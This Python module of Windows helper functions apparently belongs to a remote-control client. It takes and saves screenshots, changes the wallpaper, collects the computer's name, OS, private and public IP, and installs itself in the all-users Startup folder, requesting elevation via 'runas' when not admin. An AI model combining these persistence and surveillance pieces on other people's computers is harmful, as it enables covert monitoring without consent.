#  Copyright (c) 2022. Esteban Restoy e.restoy24@gmail.com

"""System modules"""
import ctypes
import datetime
import json
import os
import platform
import socket
import sys
from os import getcwd
from os.path import exists

import pyautogui
from requests import get


def change_background_image(uri: str):
    """
    This function is used change the background image of a Windows computer
    1) change the background with the uri path
    :param uri: The path of the image file to send in background
    """
    ctypes.windll.user32.SystemParametersInfoW(20, 0, uri, 0)


def take_screenshot(uri: str):
    """
    This function is used take a screenshot of a Windows computer
    1) Take a picture of the screen with the pyautogui module
    2) Rename the picture file with the date of the day
    3) Save the file on the computer
    :param uri: The path of the image file to create with the screenshot
    """
    my_screenshot = pyautogui.screenshot()
    name = f"{datetime.datetime.now().strftime(os.getenv('DATETIME_FORMAT_OF_SCREENSHOT_IMAGE'))}" \
           f".{os.getenv('SCREENSHOT_FORMAT')}"
    full_path = uri + name

    my_screenshot.save(full_path)
    return full_path


def get_computer_name():
    """
    This function is used to get the computer name information
    1) Return the name of the computer with the platform lib
    """
    my_system = platform.uname()
    return my_system.node


def get_computer_os():
    """
    This function is used to get the computer os information
    1) Return the os of the computer with the platform lib
    """
    my_system = platform.uname()
    return my_system.system[0].upper() + my_system.release


def get_private_ip():
    """
    This function is used to get the computer local IP information
    1) Create a socket witch connect to Google DNS on port 80
    2) Return the sockname ip
    """
    google_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    google_socket.connect(("8.8.8.8", 80))
    return google_socket.getsockname()[0]


def get_public_ip():
    """
    This function is used to get the computer public IP information
    1) Make a request to the ipify api witch return the public IP of the Client
    2) Return result of the request
    """
    public_ip = get('https://api.ipify.org').text
    return public_ip


def startup_exec():
    """
    This function is used to add a bat file in the startup folder of Windows.
    This bat file launch the exe file at startup
    1) Prepare the path of the startup file
    2) Check if the file already exist
    3) Create the BAT file if it doesnt already exist
    """
    bat_full_path = r'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\' + \
                    os.getenv("STARTUP_BAT_FILE_NAME") + '.bat'

    if not exists(bat_full_path):
        if is_admin():
            with open(bat_full_path, "w+", encoding="utf-8") as bat_file:
                bat_file.write(r'start ' + sys.argv[0])
        else:
            ctypes.windll.shell32.ShellExecuteW(None,
                                                "runas",
                                                sys.executable,
                                                " ".join(sys.argv),
                                                None,
                                                1)


def is_admin():
    """
    This function is used to know if this script is executed with admin right or not
    1) Return the result of the IsUserAnAdmin function of the windll lib
    """
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except RuntimeError:
        return False
